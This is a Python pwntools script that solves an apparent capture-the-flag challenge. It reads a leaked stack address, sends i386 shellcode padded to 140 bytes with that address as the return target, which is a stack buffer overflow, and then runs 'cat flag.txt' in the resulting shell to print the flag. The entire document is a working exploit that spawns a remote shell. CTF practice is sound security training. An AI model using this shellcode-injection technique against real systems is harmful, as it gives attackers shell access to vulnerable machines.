#!/usr/bin/env python3

from pwn import *
import re

context.log_level = logging.ERROR

exe = ELF("./chall")

context.binary = exe
context.terminal = ["termite","-e"]

def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("pwn.citeflag.online", 3418)


def main():
    r = conn()
    stack_addr = int(re.search("\((.*)\)", r.readline().decode('ascii')).group(1),16)
    payload = asm(shellcraft.i386.linux.sh())
    payload += b"A" * (140 - len(payload)) # fill data buffer
    payload += p32(stack_addr)
    r.sendline(payload)
    r.sendline("cat flag.txt;exit;")
    print(re.search("(CITEFLAG{.*})",r.recvall().decode()).group(1))


if __name__ == "__main__":
    main()